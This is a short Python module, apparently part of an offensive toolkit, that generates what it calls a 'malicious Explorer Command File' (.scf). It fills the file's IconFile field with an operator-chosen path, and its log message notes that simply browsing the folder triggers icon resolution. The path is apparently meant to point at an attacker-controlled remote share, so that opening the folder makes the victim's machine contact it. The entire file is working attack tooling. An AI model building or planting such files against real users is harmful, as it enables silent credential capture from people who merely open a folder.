#!/usr/bin/env python
# encoding: utf-8

import logging
from modules.mp_generator import Generator
from collections import OrderedDict

SCF_TEMPLATE = \
r"""
[Shell]
Command=2
IconFile=<<<ICON_FILE>>>
[Taskbar]
Command=ToggleDesktop
"""

class SCFGenerator(Generator):
    """ Module used to generate malicious Explorer Command File"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(" [+] Generating %s file..." % self.outputFileType)
        paramDict = OrderedDict([("iconFilePath",None)])      
        self.fillInputParams(paramDict)
        
        
        # Fill template
        scfContent = SCF_TEMPLATE
        scfContent = scfContent.replace("<<<ICON_FILE>>>", paramDict["iconFilePath"])
             
        # Write in new SCF file
        f = open(self.outputFilePath, 'w')
        f.writelines(scfContent)
        f.close()
        
        logging.info("   [-] Generated SCF file: %s" % self.outputFilePath)
        logging.info("   [-] Test with: \nBrowse %s dir to trigger icon resolution. Click on file to toggle desktop.\n" % self.outputFilePath)
        

        
        
        